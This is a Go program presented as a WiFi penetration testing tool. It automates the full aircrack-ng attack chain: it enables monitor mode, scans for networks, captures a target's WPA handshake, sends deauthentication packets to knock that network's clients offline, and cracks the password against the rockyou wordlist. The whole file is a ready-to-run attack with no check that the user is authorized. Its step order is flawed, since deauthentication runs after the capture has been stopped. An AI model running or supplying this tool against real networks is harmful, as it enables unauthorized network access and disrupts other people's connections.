package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

// Network represents a WiFi network
type Network struct {
	ID      int
	BSSID   string
	ESSID   string
	Channel string
	Signal  string
}

func main() {
	fmt.Println(`
╔══════════════════════════════════════════════╗
║    WiFi Penetration Testing Tool            ║
║    Created with Go                          ║
╚══════════════════════════════════════════════╝
	`)

	// Step 1: Kill conflicting processes
	killConflictingProcesses()

	// Step 2: Get available interfaces
	interfaceName := selectInterface()
	if interfaceName == "" {
		log.Fatal("No interface selected. Exiting.")
	}

	// Step 3: Enable monitor mode
	enableMonitorMode(interfaceName)
	monitorInterface := interfaceName + "mon"

	// Step 4: Scan for networks
	fmt.Println("\n[+] Scanning for networks...")
	networks := scanNetworks(monitorInterface)
	if len(networks) == 0 {
		log.Fatal("No networks found. Exiting.")
	}

	// Step 5: Select target network
	targetNetwork := selectTargetNetwork(networks)

	// Step 6: Capture handshake
	fmt.Printf("\n[+] Targeting network: %s (%s)\n", targetNetwork.ESSID, targetNetwork.BSSID)
	captureFile := captureHandshake(monitorInterface, targetNetwork)

	// Step 7: Deauth clients
	fmt.Println("\n[+] Deauthenticating clients...")
	deauthClients(monitorInterface, targetNetwork.BSSID, 10)

	// Step 8: Stop monitor mode
	stopMonitorMode(monitorInterface)

	// Step 9: Crack password
	fmt.Println("\n[+] Attempting to crack password...")
	crackPassword(captureFile)

	fmt.Println("\n[+] Process completed!")
}

func killConflictingProcesses() {
	fmt.Println("[+] Checking for conflicting processes...")

	cmd := exec.Command("sudo", "airmon-ng", "check", "kill")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		fmt.Printf("[-] Error killing processes: %v\n", err)
	}

	time.Sleep(2 * time.Second)
	fmt.Println("[✓] Conflicting processes terminated")
}

func selectInterface() string {
	fmt.Println("\n[+] Available network interfaces:")

	cmd := exec.Command("iwconfig")
	output, err := cmd.Output()
	if err != nil {
		log.Fatal("Error getting interfaces: ", err)
	}

	lines := strings.Split(string(output), "\n")
	var interfaces []string

	for _, line := range lines {
		if strings.Contains(line, "IEEE 802.11") && !strings.Contains(line, "no wireless") {
			parts := strings.Fields(line)
			if len(parts) > 0 {
				interfaces = append(interfaces, parts[0])
			}
		}
	}

	if len(interfaces) == 0 {
		fmt.Println("[-] No wireless interfaces found")
		return ""
	}

	for i, iface := range interfaces {
		fmt.Printf("  %d. %s\n", i+1, iface)
	}

	fmt.Print("\nSelect interface number: ")
	reader := bufio.NewReader(os.Stdin)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	choice, err := strconv.Atoi(input)
	if err != nil || choice < 1 || choice > len(interfaces) {
		fmt.Println("[-] Invalid selection")
		return ""
	}

	return interfaces[choice-1]
}

func enableMonitorMode(interfaceName string) {
	fmt.Printf("\n[+] Enabling monitor mode on %s...\n", interfaceName)

	cmd := exec.Command("sudo", "airmon-ng", "start", interfaceName)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		log.Fatal("Error enabling monitor mode: ", err)
	}

	time.Sleep(2 * time.Second)
	fmt.Printf("[✓] Monitor mode enabled on %s\n", interfaceName)
}

func scanNetworks(monitorInterface string) []Network {
	fmt.Println("\n[+] Scanning networks...")
	fmt.Println("[i] Press 's' and Enter to stop scanning when ready")

	// Local file prefix
	cwd, _ := os.Getwd()
	tmpPrefix := cwd + "/wifi_scan"

	// Cleanup previous scans
	files, _ := os.ReadDir(cwd)
	for _, f := range files {
		if strings.HasPrefix(f.Name(), "wifi_scan-") {
			os.Remove(f.Name())
		}
	}

	// Run airodump-ng in background, outputting to CSV
	cmd := exec.Command("sudo", "airodump-ng",
		"--output-format", "csv",
		"-w", tmpPrefix,
		monitorInterface)

	// Suppress output
	cmd.Stdout = nil
	cmd.Stderr = nil

	if err := cmd.Start(); err != nil {
		log.Fatal("Error starting scan: ", err)
	}

	// Wait for user input to stop
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text == "s" || text == "S" {
			break
		}
		fmt.Println("[!] Press 's' and Enter to stop scanning")
	}

	// Kill the process
	cmd.Process.Kill()
	cmd.Wait()

	// Parse the CSV
	csvFile := tmpPrefix + "-01.csv"

	// Wait a moment for file write to finish
	time.Sleep(1 * time.Second)

	networks, err := parseAirodumpCSV(csvFile)
	if err != nil {
		fmt.Printf("[-] Error parsing scan results (%s): %v\n", csvFile, err)
		return []Network{}
	}

	// Cleanup
	os.Remove(csvFile)

	return networks
}

func parseAirodumpCSV(filename string) ([]Network, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var networks []Network
	scanner := bufio.NewScanner(file)

	// Airodump CSV has two sections. We only want the first (AP) section.
	// It starts with headers.
	// BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key

	// Example parsed line needs to ensure we hit the right columns.
	// BSSID is col 0, Channel is col 3, Power (Signal) is col 8, ESSID is col 13

	idCounter := 1
	hasHeader := false

	for scanner.Scan() {
		line := scanner.Text()

		// Section separator check
		if strings.TrimSpace(line) == "" || strings.HasPrefix(line, "Station MAC") {
			if len(networks) > 0 {
				break // Stop processing when we hit clients section
			}
			continue
		}

		parts := strings.Split(line, ",")
		if len(parts) < 14 {
			continue
		}

		// Clean tokens
		for i := range parts {
			parts[i] = strings.TrimSpace(parts[i])
		}

		if parts[0] == "BSSID" {
			hasHeader = true
			continue
		}

		if !hasHeader {
			continue // Skip until we find header
		}

		// Parse fields
		bssid := parts[0]
		channel := parts[3]
		signal := parts[8]
		essid := parts[13]

		// Filter out empty lines or invalid rows
		if bssid == "" || essid == "" {
			continue
		}

		networks = append(networks, Network{
			ID:      idCounter,
			BSSID:   bssid,
			ESSID:   essid,
			Channel: channel,
			Signal:  signal,
		})
		idCounter++
	}

	return networks, scanner.Err()
}

func selectTargetNetwork(networks []Network) Network {
	fmt.Println("\n[+] Available Networks:")
	fmt.Println("┌────┬────────────────────┬──────────────┬─────────┬────────┐")
	fmt.Println("│ ID │ BSSID              │ ESSID        │ Channel │ Signal │")
	fmt.Println("├────┼────────────────────┼──────────────┼─────────┼────────┤")

	for _, net := range networks {
		fmt.Printf("│ %2d │ %17s │ %-12s │ %7s │ %6s │\n",
			net.ID, net.BSSID, net.ESSID, net.Channel, net.Signal)
	}
	fmt.Println("└────┴────────────────────┴──────────────┴─────────┴────────┘")

	fmt.Print("\nSelect target network ID: ")
	reader := bufio.NewReader(os.Stdin)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	choice, err := strconv.Atoi(input)
	if err != nil || choice < 1 || choice > len(networks) {
		log.Fatal("Invalid network selection")
	}

	return networks[choice-1]
}

func captureHandshake(monitorInterface string, target Network) string {
	captureFile := "handshake_capture"
	channel := target.Channel
	if channel == "" {
		channel = "1"
	}

	fmt.Printf("\n[+] Capturing handshake on channel %s...\n", channel)
	fmt.Println("[!] Wait for handshake capture or press Ctrl+C when WPA handshake appears")

	// Start capture in background
	cmd := exec.Command("sudo", "airodump-ng",
		"-w", captureFile,
		"-c", channel,
		"--bssid", target.BSSID,
		monitorInterface)

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	go func() {
		if err := cmd.Run(); err != nil {
			fmt.Printf("[-] Capture error: %v\n", err)
		}
	}()

	// Wait for user to see handshake
	fmt.Println("\nPress Enter when WPA handshake is captured...")
	bufio.NewReader(os.Stdin).ReadString('\n')

	// Kill capture process
	cmd.Process.Kill()
	cmd.Wait()

	return captureFile + "-01.cap"
}

func deauthClients(monitorInterface, bssid string, count int) {
	cmd := exec.Command("sudo", "aireplay-ng",
		"--deauth", strconv.Itoa(count),
		"-a", bssid,
		monitorInterface)

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		fmt.Printf("[-] Deauth error: %v\n", err)
	} else {
		fmt.Printf("[✓] Sent %d deauth packets\n", count)
	}
}

func stopMonitorMode(monitorInterface string) {
	fmt.Println("\n[+] Stopping monitor mode...")

	cmd := exec.Command("sudo", "airmon-ng", "stop", monitorInterface)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		fmt.Printf("[-] Error stopping monitor mode: %v\n", err)
	} else {
		fmt.Println("[✓] Monitor mode stopped")
	}

	// Restart NetworkManager
	fmt.Println("[+] Restarting NetworkManager...")
	cmd = exec.Command("sudo", "systemctl", "start", "NetworkManager")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		fmt.Printf("[-] Error starting NetworkManager: %v\n", err)
	} else {
		fmt.Println("[✓] NetworkManager restarted")
	}
}

func crackPassword(capFile string) {
	// Check if rockyou.txt exists
	wordlist := "/usr/share/wordlists/rockyou.txt"

	// Check if rockyou is gzipped
	if _, err := os.Stat(wordlist + ".gz"); err == nil {
		fmt.Println("[+] Found gzipped rockyou.txt, extracting...")
		cmd := exec.Command("gunzip", "-k", wordlist+".gz")
		if err := cmd.Run(); err != nil {
			fmt.Printf("[-] Error extracting wordlist: %v\n", err)
			return
		}
	}

	if _, err := os.Stat(wordlist); os.IsNotExist(err) {
		fmt.Println("[-] Wordlist not found. Install it with:")
		fmt.Println("    sudo apt install wordlists")
		fmt.Println("    or download from: https://github.com/brannondorsey/naive-hashcat/releases")
		return
	}

	if _, err := os.Stat(capFile); os.IsNotExist(err) {
		fmt.Printf("[-] Capture file %s not found\n", capFile)
		return
	}

	fmt.Println("\n[+] Starting password crack...")
	fmt.Println("    This may take a while depending on wordlist size")
	fmt.Println("    Press Ctrl+C to abort\n")

	cmd := exec.Command("sudo", "aircrack-ng",
		capFile,
		"-w", wordlist)

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		fmt.Printf("[-] Cracking error: %v\n", err)
	}
}
